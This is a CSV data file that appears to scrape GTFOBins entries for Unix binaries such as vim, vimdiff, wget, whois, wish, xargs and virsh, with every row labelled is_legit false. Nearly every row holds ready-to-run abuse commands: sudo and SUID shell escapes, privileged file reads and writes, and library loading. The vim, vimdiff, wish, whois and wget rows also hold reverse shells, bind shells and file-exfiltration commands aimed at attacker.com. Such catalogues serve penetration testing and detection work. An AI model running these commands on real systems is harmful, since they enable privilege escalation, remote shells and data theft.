"Name","functions","functions_shell","functions_shell_description","functions_shell_code","functions_sudo","functions_sudo_description","functions_sudo_code","description","functions_file-read","functions_file-read_code","functions_suid","functions_suid_code","functions_file-write","functions_file-write_code","functions_limited-suid","functions_limited-suid_code","functions_file-download","functions_file-download_description","functions_file-download_code","functions_file-read_description","functions_suid_description","functions_non-interactive-reverse-shell","functions_non-interactive-reverse-shell_description","functions_non-interactive-reverse-shell_code","functions_command","functions_command_description","functions_command_code","functions_file-upload","functions_file-upload_description","functions_file-upload_code","functions_file-write_description","functions_reverse-shell","functions_reverse-shell_description","functions_reverse-shell_code","functions_non-interactive-bind-shell","functions_non-interactive-bind-shell_description","functions_non-interactive-bind-shell_code","functions_library-load","functions_library-load_description","functions_library-load_code","functions_capabilities","functions_capabilities_description","functions_capabilities_code","functions_limited-suid_description","functions_bind-shell","functions_bind-shell_description","functions_bind-shell_code","is_legit"
"xelatex","","","xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","The read file will be part of the output.","[''sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi ''-|-''sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}' '']","","","xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi","","","","","","./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","","","The read file will be part of the output.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xdotool","","","xdotool exec --sync /bin/sh","","","sudo xdotool exec --sync /bin/sh","This requires a running X server.","","","","./xdotool exec --sync /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xdg-user-dir","","","","","","","The current implementation of `xdg-user-dir` is basically `eval echo \${XDG_${1}_DIR:-$HOME}`, thus is can be easily used to achieve command execution.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xargs","","[''GNU version only.''-|-''Read interactively from `stdin`.'']","[''xargs -a /dev/null sh''-|-''echo x | xargs -Iy sh -c 'exec sh 0<&1'''-|-''xargs -Ix sh -c 'exec sh 0<&1' x^D^D '']","","GNU version only.","sudo xargs -a /dev/null sh","","","LFILE=file_to_read xargs -a ""$LFILE"" -0","","./xargs -a /dev/null sh -p","","","","","","","","This works as long as the file does not contain the NUL character, also a trailing `$'\n'` is added. The actual `/bin/echo` command is executed. GNU version only.","GNU version only.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"wish","","","wish exec /bin/sh <@stdin >@stdout 2>@stderr","","","sudo wish exec /bin/sh <@stdin >@stdout 2>@stderr","","","","","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish","","","","","","","","","","","","","","","","","","","","","","","","false"
"wireshark","","","","","This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.  After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:  1. select the only received packet;  2. right-click on ""Data"" from the ""Packet Details"" pane, and select ""Export Packet Bytes..."";  3. choose where to save the packet dump.","PORT=4444 sudo wireshark -c 1 -i lo -k -f ""udp port $PORT"" & echo 'DATA' | nc -u 127.127.127.127 ""$PORT""","","","","","","","","","","","","","","","","","","","This requires GUI interaction. Start Wireshark, then from the main menu, select ""Tools"" -> ""Lua"" -> ""Evaluate"". A window opens that allows to execute [`lua`](/gtfobins/lua/) code.","wireshark","","","","","","","","","","","","","","","","","","","","","false"
"whois","","","","","","","`whois` hangs waiting for the remote peer to close the socket.","","","","","","","","","","[''Fetch remote text file from a remote TCP port. Run `nc -l -p 12345 < ""file_to_send""` on the attacker box to send the file. The file has instances of `$'\x0d'` stripped.''-|-''Fetch remote binary file from a remote TCP port. Run `base64 ""file_to_send"" | nc -l -p 12345` on the attacker box to send the file.'']","[''RHOST=attacker.com RPORT=12345 LFILE=file_to_save whois -h $RHOST -p $RPORT > ""$LFILE"" ''-|-''RHOST=attacker.com RPORT=12345 LFILE=file_to_save whois -h $RHOST -p $RPORT | base64 -d > ""$LFILE""'']","","","","","","","","","","[''Send a text file to a TCP port. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. The file has a trailing `$'\x0d\x0a'` and its length is limited by the maximum size of arguments.''-|-''Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\x0d' | base64 -d > ""file_to_save""` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.'']","[''RHOST=attacker.com RPORT=12345 LFILE=file_to_send whois -h $RHOST -p $RPORT ""`cat $LFILE`"" ''-|-''RHOST=attacker.com RPORT=12345 LFILE=file_to_send whois -h $RHOST -p $RPORT ""`base64 $LFILE`"" '']","","","","","","","","","","","","","","","","","","false"
"whiptail","","","","","","LFILE=file_to_read sudo whiptail --textbox --scrolltext ""$LFILE"" 0 0","The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.","","LFILE=file_to_read whiptail --textbox --scrolltext ""$LFILE"" 0 0","","LFILE=file_to_read ./whiptail --textbox --scrolltext ""$LFILE"" 0 0","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"wget","","","TF=$(mktemp) chmod +x $TF echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF wget --use-askpass=$TF 0","","","TF=$(mktemp) chmod +x $TF echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF sudo wget --use-askpass=$TF 0","","","LFILE=file_to_read wget -i $LFILE","","TF=$(mktemp) chmod +x $TF echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF ./wget --use-askpass=$TF 0","","LFILE=file_to_write TF=$(mktemp) echo DATA > $TF wget -i $TF -o $LFILE","","","","Fetch a remote file via HTTP GET request.","URL=http://attacker.com/file_to_get LFILE=file_to_save wget $URL -O $LFILE","The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.","","","","","","","","","Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.","URL=http://attacker.com/ LFILE=file_to_send wget --post-file=$LFILE $URL","The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.","","","","","","","","","","","","","","","","","false"
"wc","","","","","","LFILE=file_to_read sudo wc --files0-from ""$LFILE""","The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message, so this may not be suitable to read binary files.","","LFILE=file_to_read wc --files0-from ""$LFILE""","","LFILE=file_to_read ./wc --files0-from ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"watch","","","watch -x sh -c 'reset; exec sh 1>&0 2>&0'","","","sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'","","","","","./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'","","","","./watch 'reset; exec sh 1>&0 2>&0'","","","","","This keeps the SUID privileges only if the `-x` option is present.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"wall","","","","","","LFILE=file_to_read sudo wall --nobanner ""$LFILE""","The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`).","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"w3m","","","","","","LFILE=file_to_read sudo w3m ""$LFILE"" -dump","","","LFILE=file_to_read w3m ""$LFILE"" -dump","","LFILE=file_to_read ./w3m ""$LFILE"" -dump","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"volatility","","","volatility -f file.dump volshell __import__('os').system('/bin/sh')","","","","This command requires some valid coredump file which, if not available, can be uploaded to the target. The `volshell` command spawns a [`python`](/gtfobins/python/) shell, other functions may apply.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"virsh","","","","","","SCRIPT=script_to_run TF=$(mktemp) cat > $TF << EOF <domain type='kvm'>   <name>x</name>   <os>     <type arch='x86_64'>hvm</type>   </os>   <memory unit='KiB'>1</memory>   <devices>     <interface type='ethernet'>       <script path='$SCRIPT'/>     </interface>   </devices> </domain> EOF sudo virsh -c qemu:///system create $TF virsh -c qemu:///system destroy x","","","LFILE_DIR=/root LFILE_NAME=file_to_read  SPATH=file_to_save  virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH virsh -c qemu:///system pool-destroy x","","","","LFILE_DIR=/root LFILE_NAME=file_to_write  echo 'data' > data_to_write  TF=$(mktemp) cat > $TF <<EOF <volume type='file'>   <name>y</name>   <key>$LFILE_DIR/$LFILE_NAME</key>   <source>   </source>   <capacity unit='bytes'>5</capacity>   <allocation unit='bytes'>4096</allocation>   <physical unit='bytes'>5</physical>   <target>     <path>$LFILE_DIR/$LFILE_NAME</path>     <format type='raw'/>     <permissions>       <mode>0600</mode>       <owner>0</owner>       <group>0</group>     </permissions>   </target> </volume> EOF  virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR virsh -c qemu:///system vol-create --pool x --file $TF virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write virsh -c qemu:///system pool-destroy x","","","","","","This requires the user to be in the `libvirt` group to perform privileged file read.","","","","","","","","","","","This requires the user to be in the `libvirt` group to perform privileged file write. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.","","","","","","","","","","","","","","","","","false"
"vipw","","","","","","sudo vipw","This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`.","","","","./vipw","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"vimdiff","","[''This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `vimdiff` is compiled with Lua support.'']","[''vimdiff -c ':!/bin/sh'''-|-''vimdiff :set shell=/bin/sh :shell ''-|-''vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''vimdiff -c ':lua os.execute(""reset; exec sh"")''']","","[''This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `vimdiff` is compiled with Lua support.'']","[''sudo vimdiff -c ':!/bin/sh'''-|-''sudo vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''sudo vimdiff -c ':lua os.execute(""reset; exec sh"")''']","","","vimdiff file_to_read","","./vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","","vimdiff file_to_write iDATA ^[ w","","./vimdiff -c ':lua os.execute(""reset; exec sh"")'","","[''This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.''-|-''Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/file_to_get export LFILE=file_to_save vimdiff -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""]) vim.command("":q!"")' ''-|-''export LPORT=12345 export LFILE=file_to_save vimdiff -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);' '']","","This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.","export RHOST=attacker.com export RPORT=12345 vimdiff -c ':lua local s=require(""socket""); local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","[''This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.''-|-''Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send vimdiff -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode())) vim.command("":q!"")' ''-|-''export LPORT=8888 vimdiff -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever() vim.command("":q!"")' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send vimdiff -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();' '']","","","This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"") vim.command("":q!"")'","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.","export LPORT=12345 vimdiff -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.","vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","","This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.","./vimdiff -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","This requires that `vimdiff` is compiled with Lua support.","","","","false"
"vim","","[''This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `vim` is compiled with Lua support.'']","[''vim -c ':!/bin/sh'''-|-''vim --cmd ':set shell=/bin/sh|:shell'''-|-''vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''vim -c ':lua os.execute(""reset; exec sh"")''']","","[''This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `vim` is compiled with Lua support.'']","[''sudo vim -c ':!/bin/sh'''-|-''sudo vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''sudo vim -c ':lua os.execute(""reset; exec sh"")''']","","","vim file_to_read","","./vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","","vim file_to_write iDATA ^[ w","","./vim -c ':lua os.execute(""reset; exec sh"")'","","[''This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.''-|-''Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/file_to_get export LFILE=file_to_save vim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""]) vim.command("":q!"")' ''-|-''export LPORT=12345 export LFILE=file_to_save vim -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);' '']","","This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.","export RHOST=attacker.com export RPORT=12345 vim -c ':lua local s=require(""socket""); local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","[''This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.''-|-''Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send vim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode())) vim.command("":q!"")' ''-|-''export LPORT=8888 vim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever() vim.command("":q!"")' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send vim -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();' '']","","","This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 vim -c ':py import vim,sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"") vim.command("":q!"")'","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.","export LPORT=12345 vim -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.","vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","","This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.","./vim -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","This requires that `vim` is compiled with Lua support.","","","","false"
"vigr","","","","","","sudo vigr","This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`.","","","","./vigr","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
